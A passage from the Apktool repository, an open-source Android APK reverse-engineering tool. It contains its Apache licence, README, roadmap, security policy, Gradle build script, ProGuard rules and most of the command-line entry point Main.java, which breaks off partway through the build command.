    ./gradlew :brut.apktool:apktool-lib:test --tests "*BuildAndDecodeTest" --debug-jvm

```

`LICENSE.md`:

```md
                                 Apache License
                           Version 2.0, January 2004
                        https://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding those notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   Copyright 2010 Ryszard Wiśniewski

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       https://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

```

`README.md`:

```md
### Apktool
_This is the repository for Apktool. The website is at the [apktool.org](https://github.com/iBotPeaches/apktool.org) repository._

[![CI](https://github.com/iBotPeaches/Apktool/actions/workflows/build.yml/badge.svg)](https://github.com/iBotPeaches/Apktool/actions/workflows/test.yml)
[![Software License](https://img.shields.io/badge/license-Apache%202.0-brightgreen.svg)](https://github.com/iBotPeaches/Apktool/blob/master/LICENSE.md)

Apktool is a tool for reverse engineering third-party, closed, binary, Android apps. It can decode resources to nearly original form and rebuild them after making some modifications; it makes it possible to debug smali code step-by-step. It also makes working with apps easier thanks to project-like file structure and automation of some repetitive tasks such as building apk, etc.

Apktool is **NOT** intended for piracy and other non-legal uses. It could be used for localizing and adding features, adding support for custom platforms, and other GOOD purposes. Just try to be fair with the authors of an app, that you use and probably like.

### Branches
- `main` - Apktool 3.x branch
- `2.x` - Maintenance branch for Apktool 2.x releases

#### Support
- [Project Page](https://apktool.org)
- [#apktool on libera.chat](https://web.libera.chat)

#### Security Vulnerabilities

If you discover a security vulnerability within Apktool, please send an e-mail to Connor Tumbleson at connor.tumbleson(at)gmail.com. All security vulnerabilities will be promptly addressed.

#### Links
- [Downloads](https://bitbucket.org/iBotPeaches/apktool/downloads)
- [Downloads Mirror](https://connortumbleson.com/apktool)
- [How to Build](https://apktool.org/docs/build)
- [Documentation](https://apktool.org/wiki/the-basics/intro)
- [Bug Reports](https://github.com/iBotPeaches/Apktool/issues)
- [Changelog/Information](https://apktool.org/blog)
- [XDA Post](https://forum.xda-developers.com/t/util-dec-2-2020-apktool-tool-for-reverse-engineering-apk-files.1755243/)
- [Source (GitHub)](https://github.com/iBotPeaches/Apktool)
- [Source (Bitbucket)](https://bitbucket.org/iBotPeaches/apktool/)


## Sponsors

Special thanks goes to the following sponsors:

### Sourcetoad
[Sourcetoad](https://sourcetoad.com/) is an award-winning software and app development firm committed to the co-creation of technology solutions that solve complex business problems, delight users, and help our clients achieve their goals.

<a href="https://www.sourcetoad.com" alt="Sourcetoad">
    <picture>
        <img src="https://github.com/ibotpeaches/apktool/raw/main/.github/assets/sponsors/sourcetoad-horizontal.svg">
    </picture>
</a>

### Emerge Tools

[Emerge Tools](https://www.emergetools.com) is a suite of revolutionary products designed to supercharge mobile apps and the teams that build them.

<a href="https://www.emergetools.com" alt="Emerge Tools">
    <picture>
        <source media="(prefers-color-scheme: dark)" srcset="https://github.com/ibotpeaches/apktool/raw/main/.github/assets/sponsors/emerge-tools-vertical-white.svg">
        <source media="(prefers-color-scheme: light)" srcset="https://github.com/ibotpeaches/apktool/raw/main/.github/assets/sponsors/emerge-tools-vertical-black.svg">
        <img src="https://github.com/ibotpeaches/apktool/raw/main/.github/assets/sponsors/emerge-tools-vertical-black.svg">
    </picture>
</a>

```

`ROADMAP.md`:

```md
## Automatic Remapping of ResourceId
We currently prevent resourceIds from changing, by utilizing the `public.xml` file which makes the resources public, but
then prevents them to be used in some locations (`android:scheme`). The correct fix would be to record the resourceIds
and use dexlib2 (no regular expressions) to rewrite them to the new resourceId after the `resources.arsc` is built.

This would be a lookup table of old->new resourceIds leveraging the API of dexlib2 to do the replacement. Doing this
properly would nullify the need to do [#191](https://github.com/iBotPeaches/Apktool/issues/191)

Suggestions: [#244](https://github.com/iBotPeaches/Apktool/issues/244)
Discussions: [#2062](https://github.com/iBotPeaches/Apktool/issues/2062)

## Implicit Qualifiers Cleanup
Currently we have a mismatch between reading the folders and reading the qualifiers which leads to a mismatch between
implicit qualifiers like version (-v4, v13, etc).

This was first spotted in bug [#1272](https://github.com/iBotPeaches/Apktool/issues/1272).

This was attempted to be fixed in [!1758](https://github.com/iBotPeaches/Apktool/pull/1758/files), but had to be
reverted due to [this](https://github.com/iBotPeaches/Apktool/issues/1272#issuecomment-379345005).

Suggestions: [#2237](https://github.com/iBotPeaches/Apktool/issues/2237)

## Qualifier Plugin System
For some OEMs, past and present. They re-use qualifiers that AOSP ends up using. This with CTS is becoming very
rare and pretty much a problem of the past, but now custom modifications and more "off the cuff" OEMs are doing
it.

Apktool can't do anything because it stays true to AOSP. It would need a plugin system that controls how to
read the qualifiers. Or even an override file.

Suggestions: [#1420](https://github.com/iBotPeaches/Apktool/issues/1420), [#2474](https://github.com/iBotPeaches/Apktool/issues/2474)

## Non-reference Resources
Some applications may shove resources into the /res folder, but have no references to them. Apktool follows
the resource table, so these files are effectively abandoned.

Crawling the filesystem for non-checked files would be slow especially having to cross check with already
parsed files.

Suggestions: [#1366](https://github.com/iBotPeaches/Apktool/issues/1366)

## Android Support
Folks have requested running Apktool on device itself. This has been a challenge due to the arch requirements
that would be placed on the aapt2/aapt binaries.

Suggestions: [#2811](https://github.com/iBotPeaches/Apktool/issues/2811)

## Split APK Support
Applications are further getting split on qualifiers. Apktool has been built on the assumption of one apk.

Suggestions: [#2283](https://github.com/iBotPeaches/Apktool/issues/2283), [#2218](https://github.com/iBotPeaches/Apktool/issues/2218), [#2880](https://github.com/iBotPeaches/Apktool/issues/2880)

## Version relevant framework files
Applications are built against a specific framework version. Apktool ships with the latest framework file at that
time of release. So an application built with API 33 may be recompiled with API 36 which leads to issues.

Apktool packing 15+ older framework files would bloat the distribution. A better solution would be to have a
central repository of framework files that Apktool can download on demand, but that would require hosting
and maintenance.

Suggestions: [#3946](https://github.com/iBotPeaches/Apktool/issues/3946)

```

`SECURITY.md`:

```md
# Security Policy

## Reporting a Vulnerability

If you discover a security vulnerability within Apktool, please send an e-mail to Connor Tumbleson at connor.tumbleson(at)gmail.com. 
All security vulnerabilities will be promptly addressed.

```

`brut.apktool/apktool-cli/build.gradle.kts`:

```kts
val gitRevision: String by rootProject.extra
val apktoolVersion: String by rootProject.extra
val r8: Configuration by configurations.creating

plugins {
    application
}

dependencies {
    implementation(project(":brut.apktool:apktool-lib"))
    implementation(libs.commons.cli)
    r8(libs.r8)
}

application {
    mainClass.set("brut.apktool.Main")

    tasks.run.get().workingDir = file(System.getProperty("user.dir"))
}

tasks {
    processResources {
        from("src/main/resources") {
            include("apktool.properties")
            expand("version" to apktoolVersion, "gitrev" to gitRevision)
            duplicatesStrategy = DuplicatesStrategy.INCLUDE
        }
        includeEmptyDirs = false
    }
}

tasks.withType<AbstractArchiveTask>().configureEach {
    isPreserveFileTimestamps = false
    isReproducibleFileOrder = true
}

tasks.register<Delete>("cleanOutputDirectory") {
    delete(fileTree("build/libs") {
        exclude("apktool-cli-sources.jar")
        exclude("apktool-cli-javadoc.jar")
        exclude("apktool-cli-all.jar")
    })
}

val shadowJar = tasks.register("shadowJar", Jar::class) {
    dependsOn("build")
    dependsOn("cleanOutputDirectory")

    group = "build"
    description = "Creates a single executable JAR with all dependencies"
    manifest.attributes["Main-Class"] = "brut.apktool.Main"
    duplicatesStrategy = DuplicatesStrategy.EXCLUDE

    val dependencies = configurations
        .runtimeClasspath
        .get()
        .map(::zipTree)

    from(dependencies)
    with(tasks.jar.get())
}

tasks.register<JavaExec>("proguard") {
    dependsOn("shadowJar")

    onlyIf {
        JavaVersion.current().isJava11Compatible
    }

    val proguardRules = file("proguard-rules.pro")
    val originalJar = shadowJar.map { it.outputs.files.singleFile }

    inputs.files(originalJar, proguardRules)
    outputs.file("build/libs/apktool-$apktoolVersion.jar")

    classpath(r8)
    mainClass.set("com.android.tools.r8.R8")

    args(
        "--release",
        "--classfile",
        "--no-minification",
        "--map-diagnostics:UnusedProguardKeepRuleDiagnostic", "info", "none",
        "--lib", javaLauncher.get().metadata.installationPath.toString(),
        "--output", outputs.files.singleFile.toString(),
        "--pg-conf", proguardRules.toString(),
        originalJar.get().toString()
    )
}

tasks.withType<org.gradle.api.publish.maven.tasks.PublishToMavenRepository> {
    dependsOn(tasks.named("shadowJar"))
}

tasks.withType<org.gradle.plugins.signing.Sign> {
    dependsOn(tasks.named("shadowJar"))
}

tasks.withType<org.gradle.api.publish.tasks.GenerateModuleMetadata> {
    dependsOn(tasks.named("shadowJar"))
}

```

`brut.apktool/apktool-cli/proguard-rules.pro`:

```pro
-keep class brut.apktool.Main {
    public static void main(java.lang.String[]);
}
-keepclassmembers enum * {
    static **[] values();
    static ** valueOf(java.lang.String);
}

# https://github.com/iBotPeaches/Apktool/pull/3670#issuecomment-2296326878
-dontwarn com.google.j2objc.annotations.Weak
-dontwarn com.google.j2objc.annotations.RetainedWith

```

`brut.apktool/apktool-cli/src/main/java/brut/apktool/Main.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.apktool;

import brut.androlib.ApkBuilder;
import brut.androlib.ApkDecoder;
import brut.androlib.Config;
import brut.androlib.exceptions.AndrolibException;
import brut.androlib.exceptions.FrameworkNotFoundException;
import brut.androlib.exceptions.InFileNotFoundException;
import brut.androlib.exceptions.OutDirExistsException;
import brut.androlib.res.AaptManager;
import brut.androlib.res.Framework;
import brut.util.OSDetection;
import org.apache.commons.cli.*;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.InputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Arrays;
import java.util.List;
import java.util.Properties;
import java.util.logging.*;

/**
 * Main entry point of apktool.
 */
public class Main {
    private enum Verbosity { NORMAL, VERBOSE, QUIET }

    private static final Option verboseOption = Option.builder("v")
        .longOpt("verbose")
        .desc("Increase output verbosity.")
        .get();

    private static final Option quietOption = Option.builder("q")
        .longOpt("quiet")
        .desc("Suppress normal output.")
        .get();

    private static final Option jobsOption = Option.builder("j")
        .longOpt("jobs")
        .desc("Set the number of jobs to execute in parallel to <num>.")
        .hasArg()
        .argName("num")
        .type(Integer.class)
        .get();

    private static final Option frameDirOption = Option.builder("p")
        .longOpt("frame-path")
        .desc("Use framework files located in <dir>.")
        .hasArg()
        .argName("dir")
        .get();

    private static final Option frameTagOption = Option.builder("t")
        .longOpt("frame-tag")
        .desc("Use framework files tagged with <tag>.")
        .hasArg()
        .argName("tag")
        .get();

    private static final Option libOption = Option.builder("l")
        .longOpt("lib")
        .desc("Use shared library <package> located in <file>.\n"
            + "Can be specified multiple times.")
        .hasArg()
        .argName("package:file")
        .get();

    private static final Option decodeForceOption = Option.builder("f")
        .longOpt("force")
        .desc("Force delete destination directory.")
        .get();

    private static final Option decodeAllSrcOption = Option.builder("a")
        .longOpt("all-src")
        .desc("Decode all sources in the apk (includes unknown dex files).")
        .get();

    private static final Option decodeNoSrcOption = Option.builder("s")
        .longOpt("no-src")
        .desc("Do not decode sources.")
        .get();

    private static final Option decodeNoDebugInfoOption = Option.builder()
        .longOpt("no-debug-info")
        .desc("Do not include debug info in sources (.local, .param, .line, etc.)")
        .get();

    private static final Option decodeNoResOption = Option.builder("r")
        .longOpt("no-res")
        .desc("Do not decode resources.")
        .get();

    private static final Option decodeOnlyManifestOption = Option.builder()
        .longOpt("only-manifest")
        .desc("Only decode AndroidManifest.xml without resources.")
        .get();

    private static final Option decodeResResolveModeOption = Option.builder()
        .longOpt("res-resolve-mode")
        .desc("Set the resolve mode for resources to <mode>.\n"
            + "Possible values: 'default', 'greedy' or 'lazy'.")
        .hasArg()
        .argName("mode")
        .get();

    private static final Option decodeKeepBrokenResOption = Option.builder()
        .longOpt("keep-broken-res")
        .desc("Use if there was an error and some resources were dropped, e.g.\n"
            + "\"Invalid resource config detected. Dropping resources\", but you\n"
            + "want to decode them anyway, even with errors. You will have to\n"
            + "fix them manually before building.")
        .get();

    private static final Option decodeIgnoreRawValuesOption = Option.builder()
        .longOpt("ignore-raw-values")
        .desc("Ignore raw attribute values in XML resource files.")
        .get();

    private static final Option decodeMatchOriginalOption = Option.builder()
        .longOpt("match-original")
        .desc("Keep files closest to original as possible (prevents rebuild).")
        .get();

    private static final Option decodeNoAssetsOption = Option.builder()
        .longOpt("no-assets")
        .desc("Do not decode assets.")
        .get();

    private static final Option decodeOutputOption = Option.builder("o")
        .longOpt("output")
        .desc("Output decoded files to <dir>. (default: apk.out)")
        .hasArg()
        .argName("dir")
        .get();

    private static final Option buildForceOption = Option.builder("f")
        .longOpt("force")
        .desc("Skip changes detection and build all files.")
        .get();

    private static final Option buildNoApkOption = Option.builder()
        .longOpt("no-apk")
        .desc("Disable repacking of the built files into a new apk.")
        .get();

    private static final Option buildNoCrunchOption = Option.builder()
        .longOpt("no-crunch")
        .desc("Disable crunching of resource files during the build step.")
        .get();

    private static final Option buildCopyOriginalOption = Option.builder()
        .longOpt("copy-original")
        .desc("Copy original AndroidManifest.xml and META-INF. See project page for more info.")
        .get();

    private static final Option buildDebuggableOption = Option.builder()
        .longOpt("debuggable")
        .desc("Set android:debuggable to \"true\" in AndroidManifest.xml for the built apk.")
        .get();

    private static final Option buildNetSecConfOption = Option.builder()
        .longOpt("net-sec-conf")
        .desc("Add a generic network security configuration file to the built apk.")
        .get();

    private static final Option buildAaptOption = Option.builder()
        .longOpt("aapt")
        .desc("Use aapt2 binary located in <file>.")
        .hasArg()
        .argName("file")
        .get();

    private static final Option buildOutputOption = Option.builder("o")
        .longOpt("output")
        .desc("Output the built apk to <file>. (default: dist/name.apk)")
        .hasArg()
        .argName("file")
        .get();

    private static final Option frameFrameDirOption = Option.builder("p")
        .longOpt("frame-path")
        .desc("Set the path for framework files to <dir>.")
        .hasArg()
        .argName("dir")
        .get();

    private static final Option frameFrameTagOption = Option.builder("t")
        .longOpt("frame-tag")
        .desc("Suffix framework files with <tag>.")
        .hasArg()
        .argName("tag")
        .get();

    private static final Option frameForceAllOption = Option.builder("a")
        .longOpt("all")
        .desc("Include all framework files regardless of tag.")
        .get();

    private static final Options generalOptions = new Options();
    private static final Options decodeOptions = new Options();
    private static final Options buildOptions = new Options();
    private static final Options installFrameworkOptions = new Options();
    private static final Options cleanFrameworksOptions = new Options();
    private static final Options listFrameworksOptions = new Options();
    private static final Options publicizeResourcesOptions = new Options();

    private static final Props props = new Props();
    private static final Config config = new Config(props.getVersion());
    private static Options loadedOptions = null;
    private static boolean advancedMode = false;

    private static void loadOptions(Options options, boolean advanced) {
        loadedOptions = options;
        advancedMode = advanced;

        generalOptions.addOption(quietOption);
        generalOptions.addOption(verboseOption);

        if (options == null || options == decodeOptions) {
            decodeOptions.addOption(decodeAllSrcOption);
            decodeOptions.addOption(decodeForceOption);
            decodeOptions.addOption(decodeNoResOption);
            decodeOptions.addOption(decodeNoSrcOption);
            decodeOptions.addOption(decodeOutputOption);
            decodeOptions.addOption(frameDirOption);
            decodeOptions.addOption(frameTagOption);
            decodeOptions.addOption(jobsOption);
            decodeOptions.addOption(libOption);
            if (advanced) {
                decodeOptions.addOption(decodeIgnoreRawValuesOption);
                decodeOptions.addOption(decodeKeepBrokenResOption);
                decodeOptions.addOption(decodeMatchOriginalOption);
                decodeOptions.addOption(decodeNoAssetsOption);
                decodeOptions.addOption(decodeNoDebugInfoOption);
                decodeOptions.addOption(decodeOnlyManifestOption);
                decodeOptions.addOption(decodeResResolveModeOption);
            }
        }

        if (options == null || options == buildOptions) {
            buildOptions.addOption(buildForceOption);
            buildOptions.addOption(buildOutputOption);
            buildOptions.addOption(frameDirOption);
            buildOptions.addOption(jobsOption);
            buildOptions.addOption(libOption);
            if (advanced) {
                buildOptions.addOption(buildAaptOption);
                buildOptions.addOption(buildCopyOriginalOption);
                buildOptions.addOption(buildDebuggableOption);
                buildOptions.addOption(buildNetSecConfOption);
                buildOptions.addOption(buildNoApkOption);
                buildOptions.addOption(buildNoCrunchOption);
            }
        }

        if (options == null || options == installFrameworkOptions) {
            installFrameworkOptions.addOption(frameFrameDirOption);
            installFrameworkOptions.addOption(frameFrameTagOption);
        }

        if (options == null || options == cleanFrameworksOptions) {
            cleanFrameworksOptions.addOption(frameForceAllOption);
            cleanFrameworksOptions.addOption(frameFrameDirOption);
            cleanFrameworksOptions.addOption(frameFrameTagOption);
        }

        if (options == null || options == listFrameworksOptions) {
            listFrameworksOptions.addOption(frameForceAllOption);
            listFrameworksOptions.addOption(frameFrameDirOption);
            listFrameworksOptions.addOption(frameFrameTagOption);
        }
    }

    public static void main(String[] args) throws AndrolibException {
        // Headless
        System.setProperty("java.awt.headless", "true");

        // Ignore stricter validation on zip files from java 11 onwards as this is a protection technique that
        // applications use to thwart disassembly tools. We have protections in place for directory traversal
        // and handling of bogus data in the zip header, so we can ignore this.
        System.setProperty("jdk.nio.zipfs.allowDotZipEntry", "true");
        System.setProperty("jdk.util.zip.disableZip64ExtraFieldValidation", "true");

        if (!OSDetection.is64Bit()) {
            System.err.println("Warning: Apktool no longer supports 32-bit platforms.");
        }

        if (args.length == 0) {
            loadOptions(null, false);
            printUsage();
            return;
        }

        String cmdName = args[0];
        String[] cmdArgs = Arrays.copyOfRange(args, 1, args.length);

        switch (cmdName) {
            case "d":
            case "decode":
                cmdDecode(cmdArgs);
                break;
            case "b":
            case "build":
                cmdBuild(cmdArgs);
                break;
            case "if":
            case "install-framework":
                cmdInstallFramework(cmdArgs);
                break;
            case "cf":
            case "clean-frameworks":
                cmdCleanFrameworks(cmdArgs);
                break;
            case "lf":
            case "list-frameworks":
                cmdListFrameworks(cmdArgs);
                break;
            case "pr":
            case "publicize-resources":
                cmdPublicizeResources(cmdArgs);
                break;
            case "h":
            case "help":
            case "-help":
            case "--help":
                loadOptions(null, true);
                printUsage();
                break;
            case "v":
            case "version":
            case "-version":
            case "--version":
                printVersion();
                break;
            default:
                System.err.println("Unrecognized command: " + cmdName);
                loadOptions(null, false);
                printUsage();
                System.exit(1);
        }
    }

    private static CommandLine parseOptions(Options options, String[] args) {
        loadOptions(options, true);

        Options combinedOptions = new Options();
        combinedOptions.addOptions(generalOptions);
        combinedOptions.addOptions(options);

        CommandLine cli;
        try {
            cli = new DefaultParser(false).parse(combinedOptions, args, false);
        } catch (ParseException ex) {
            System.err.println(ex.getMessage());
            printUsage();
            System.exit(1);
            return null;
        }

        // Check for verbose/quiet.
        Verbosity verbosity = Verbosity.NORMAL;
        if (cli.hasOption(verboseOption)) {
            config.setVerbose(true);
            verbosity = Verbosity.VERBOSE;
        }
        if (cli.hasOption(quietOption)) {
            if (cli.hasOption(verboseOption)) {
                printOptionConflict(quietOption, verboseOption);
            } else {
                verbosity = Verbosity.QUIET;
            }
        }
        setupLogging(verbosity);

        return cli;
    }

    private static void cmdDecode(String[] args) throws AndrolibException {
        CommandLine cli = parseOptions(decodeOptions, args);
        List<String> argList = cli.getArgList();
        String apkName;
        switch (argList.size()) {
            case 0:
                System.err.println("Input apk file was not specified.");
                System.exit(1);
                return;
            case 1:
                apkName = argList.get(0);
                break;
            default:
                System.err.println("Invalid arguments.");
                printUsage();
                System.exit(1);
                return;
        }

        if (cli.hasOption(jobsOption)) {
            config.setJobs(Integer.parseInt(cli.getOptionValue(jobsOption)));
        }
        if (cli.hasOption(frameDirOption)) {
            config.setFrameworkDirectory(cli.getOptionValue(frameDirOption));
        }
        if (cli.hasOption(frameTagOption)) {
            config.setFrameworkTag(cli.getOptionValue(frameTagOption));
        }
        if (cli.hasOption(libOption)) {
            config.setLibraryFiles(cli.getOptionValues(libOption));
        }
        if (cli.hasOption(decodeForceOption)) {
            config.setForced(true);
        }
        if (cli.hasOption(decodeAllSrcOption)) {
            config.setDecodeSources(Config.DecodeSources.FULL);
        }
        if (cli.hasOption(decodeNoSrcOption)) {
            if (cli.hasOption(decodeAllSrcOption)) {
                printOptionConflict(decodeNoSrcOption, decodeAllSrcOption);
            } else {
                config.setDecodeSources(Config.DecodeSources.NONE);
            }
        }
        if (cli.hasOption(decodeNoDebugInfoOption)) {
            if (cli.hasOption(decodeNoSrcOption)) {
                printOptionConflict(decodeNoDebugInfoOption, decodeNoSrcOption);
            } else {
                config.setBaksmaliDebugMode(false);
            }
        }
        if (cli.hasOption(decodeNoResOption)) {
            config.setDecodeResources(Config.DecodeResources.NONE);
        }
        if (cli.hasOption(decodeOnlyManifestOption)) {
            if (cli.hasOption(decodeNoResOption)) {
                printOptionConflict(decodeOnlyManifestOption, decodeNoResOption);
            } else {
                config.setDecodeResources(Config.DecodeResources.ONLY_MANIFEST);
            }
        }
        if (cli.hasOption(decodeResResolveModeOption)) {
            if (cli.hasOption(decodeNoResOption)) {
                printOptionConflict(decodeResResolveModeOption, decodeNoResOption);
            } else if (cli.hasOption(decodeOnlyManifestOption)) {
                printOptionConflict(decodeResResolveModeOption, decodeOnlyManifestOption);
            } else {
                String mode = cli.getOptionValue(decodeResResolveModeOption);
                switch (mode) {
                    case "default":
                        config.setDecodeResolve(Config.DecodeResolve.DEFAULT);
                        break;
                    case "greedy":
                        config.setDecodeResolve(Config.DecodeResolve.GREEDY);
                        break;
                    case "lazy":
                        config.setDecodeResolve(Config.DecodeResolve.LAZY);
                        break;
                    default:
                        System.err.println("Unknown resolve resources mode: " + mode);
                        System.err.println("Expect: 'default', 'greedy' or 'lazy'.");
                        System.exit(1);
                        return;
                }
            }
        }
        if (cli.hasOption(decodeKeepBrokenResOption)) {
            if (cli.hasOption(decodeNoResOption)) {
                printOptionConflict(decodeKeepBrokenResOption, decodeNoResOption);
            } else if (cli.hasOption(decodeOnlyManifestOption)) {
                printOptionConflict(decodeKeepBrokenResOption, decodeOnlyManifestOption);
            } else {
                config.setKeepBrokenResources(true);
            }
        }
        if (cli.hasOption(decodeIgnoreRawValuesOption)) {
            if (cli.hasOption(decodeNoResOption)) {
                printOptionConflict(decodeIgnoreRawValuesOption, decodeNoResOption);
            } else {
                config.setIgnoreRawValues(true);
            }
        }
        if (cli.hasOption(decodeMatchOriginalOption)) {
            config.setAnalysisMode(true);
        }
        if (cli.hasOption(decodeNoAssetsOption)) {
            config.setDecodeAssets(Config.DecodeAssets.NONE);
        }

        File outDir;
        if (cli.hasOption(decodeOutputOption)) {
            outDir = new File(cli.getOptionValue(decodeOutputOption));
        } else {
            outDir = new File(apkName.endsWith(".apk")
                ? apkName.substring(0, apkName.length() - 4).trim()
                : apkName + ".out");
        }

        try {
            new ApkDecoder(new File(apkName), config).decode(outDir);
        } catch (InFileNotFoundException | OutDirExistsException | FrameworkNotFoundException ex) {
            System.err.println(ex.getMessage());
            System.exit(1);
        }
    }

    private static void cmdBuild(String[] args) throws AndrolibException {
        CommandLine cli = parseOptions(buildOptions, args);
        List<String> argList = cli.getArgList();
        String apkDirName;
        switch (argList.size()) {
            case 0:
                apkDirName = "."; // current directory
                break;
            case 1:
                apkDirName = argList.get(0);
                break;
            default:
                System.err.println("Invalid arguments.");
                printUsage();
                System.exit(1);
                return;
        }

        if (cli.hasOption(jobsOption)) {
            config.setJobs(Integer.parseInt(cli.getOptionValue(jobsOption)));
